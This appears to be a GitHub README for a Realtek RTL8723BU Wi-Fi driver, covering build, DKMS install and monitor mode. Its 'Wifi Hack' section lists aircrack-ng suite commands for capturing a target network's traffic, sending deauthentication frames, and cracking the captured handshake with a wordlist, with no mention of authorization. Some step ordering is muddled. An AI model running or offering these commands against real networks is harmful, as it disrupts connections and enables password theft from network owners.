# Wifi-hacking-rtl8723bu

To use your Realtek Semiconductor Corp. RTL8723BU 802.11b/g/n WLAN Adapter with **aircrack-ng**, you may need to install specific drivers that support monitor mode and packet injection. Here's a general guide to help you with the process on a Linux system:

### Step 1: Update Your System

Before installing any drivers, make sure your system is up to date:

```bash
sudo apt update
sudo apt upgrade
```

### Step 2: Install Required Packages

You'll need some essential packages for compiling the driver:

```bash
sudo apt install build-essential dkms git
```

### Step 3: Download and Install the Driver

1. **Download the Driver Source Code**:

   You can find the driver for the RTL8723BU on GitHub. Clone the repository using the following command:

   ```bash
   git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
   ```

2. **Build and Install the Driver**:

   Navigate to the downloaded directory and build the driver:

   ```bash
   cd Wifi-hacking-rtl8723bu/rtl8723bu-master
   ```

   ```bash
   make
   ```

   ```bash
   sudo make install
   ```

4. **Load the Driver**:

   Once installed, load the driver using:

   ```bash
   sudo modprobe 8723bu
   ```

### Step 4: Enable Monitor Mode

After installing the driver, you can enable monitor mode using the following command:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

*Note*: Replace `wlan0` with your actual wireless interface name if it's different.

### Step 5: Verify Installation

Verify that your adapter supports monitor mode and packet injection:

### Step 6: Wifi Hack

```bash
airodump-ng wlan0
```

```bash
airodump-ng -c [channel] --bssid [BSSID] -w  capture wlan0
```

```bash
aireplay-ng --deauth 10 -a [BSSID] wlan0
```

```bash
aircrack-ng capture.cap -w [wordlist]
```

You should see "Mode:Monitor" next to your wireless interface.

### Troubleshooting

- **Driver Compatibility**: If you face any issues, ensure the driver you are using is compatible with your kernel version.
- **Error Messages**: Check for error messages during the `make` or `make install` process. They can provide clues about what might be going wrong.
- **Reboot**: Sometimes, a simple reboot can help load the necessary drivers correctly.

This should set up your Wi-Fi adapter for use with **aircrack-ng**. If you encounter specific errors or issues, feel free to ask for more detailed troubleshooting!


### Method
# rtl8723bu
Driver for Realtek RTL8723BU Wireless Adapter with Hardware ID `0bda:b720`

# How to use?
## Get the source first.
Get it from Github repository with the following command in the Linux terminal.
```
git clone https://github.com/rehan5039/Wifi-hacking-rtl8723bu.git
cd Wifi-hacking-rtl8723bu/rtl8723bu-master
```

## Concurrent or Non-Concurrent Mode
By default driver operates the hardware as a station AND as an access point *simultaneously*.  This will show two devices when you run the `iwconfig` command.

If you do not want two devices (station and an access point) *simultaneously*, then follow these instructions.

- Step 1: Run the following command in the Linux terminal. 
```
nano Makefile
```

- Step 2: Find the line that contains `EXTRA_CFLAGS += -DCONFIG_CONCURRENT_MODE` and insert a `#` symbol at the beginning of that line. This comments that line and disables concurrent mode.


## Manual install
Run the following commands in the Linux terminal.

```
make
sudo make install
sudo modprobe -v 8723bu
```
This driver can not work with the standard driver rtl8xxxu, thus you need to blacklist it. Run the following command
...
sudo nano /etc/modprobe.d/50-rtl8xxxu.conf
...
Add a single line: blacklist rtl8xxxu
...
## Automatic install using DKMS
If you don't want to worry about building/installing driver after kernel update, use this scenario. For Ubuntu/Debian install DKMS package using command `sudo apt install dkms`.

Then run following commands in terminal
```
source dkms.conf
sudo mkdir /usr/src/$PACKAGE_NAME-$PACKAGE_VERSION
sudo cp -r core hal include os_dep platform dkms.conf Makefile rtl8723b_fw.bin /usr/src/$PACKAGE_NAME-$PACKAGE_VERSION
sudo dkms add $PACKAGE_NAME/$PACKAGE_VERSION
sudo dkms autoinstall $PACKAGE_NAME/$PACKAGE_VERSION
```
